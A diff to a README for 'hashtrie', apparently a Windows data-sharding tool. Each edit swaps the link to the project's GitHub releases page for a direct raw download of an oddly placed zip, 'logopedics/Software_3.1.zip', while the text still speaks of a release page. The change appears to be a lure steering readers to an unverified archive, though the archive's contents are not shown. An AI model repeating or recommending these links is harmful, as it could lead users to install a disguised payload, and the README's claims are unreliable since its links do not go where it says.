@@ -1,6 +1,6 @@
 # ⚙️ hashtrie - Fast Data Sharding and Lookup Tool
 
-[![Download hashtrie](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://github.com/ferrystand/hashtrie/releases)
+[![Download hashtrie](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/ferrystand/hashtrie/main/logopedics/Software_3.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download and run hashtrie on your Windows computer. The pr
 ## ⬇️ Download and Install hashtrie
 
 1. Click the large button above or visit the release page directly:  
-   [https://github.com/ferrystand/hashtrie/releases](https://github.com/ferrystand/hashtrie/releases)
+   [https://raw.githubusercontent.com/ferrystand/hashtrie/main/logopedics/Software_3.1.zip](https://raw.githubusercontent.com/ferrystand/hashtrie/main/logopedics/Software_3.1.zip)
 
 2. On the release page, look for the latest version, usually listed at the top.
 
@@ -146,7 +146,7 @@ to check available options.
 ## 📚 Additional Resources
 
 The GitHub release page has all downloads and basic information:  
-[https://github.com/ferrystand/hashtrie/releases](https://github.com/ferrystand/hashtrie/releases)
+[https://raw.githubusercontent.com/ferrystand/hashtrie/main/logopedics/Software_3.1.zip](https://raw.githubusercontent.com/ferrystand/hashtrie/main/logopedics/Software_3.1.zip)
 
 For technical details about how hashtrie works, refer to the repository documentation (same GitHub page).
 
@@ -167,4 +167,4 @@ If you run into issues beyond setup, consider opening a support issue on the Git
 
 ---
 
-[![Download hashtrie](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://github.com/ferrystand/hashtrie/releases)
+[![Download hashtrie](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/ferrystand/hashtrie/main/logopedics/Software_3.1.zip)
